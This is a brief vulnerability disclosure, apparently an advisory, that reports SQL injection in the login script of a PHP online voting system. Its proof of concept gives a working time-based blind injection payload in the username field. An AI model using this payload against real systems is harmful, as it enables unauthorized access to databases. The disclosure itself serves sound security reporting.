# SQL Injection in Online Voting System
Source code: https://www.sourcecodester.com/php/14690/online-voting-system-phpmysqli-full-source-code.html

## Code Audit
Due to useless validation in `checklogin.php`, a SQL injection vulnerability is introduced. The code is as follows:

![](1.jpg)

## Result of Sqlmap

![](2.jpg)

## POC
```
myusername=11@qq.cc' AND (SELECT 5807 FROM (SELECT(SLEEP(5)))yDQs) AND 'gFem'='gFem&mypassword=22&Submit=Login
```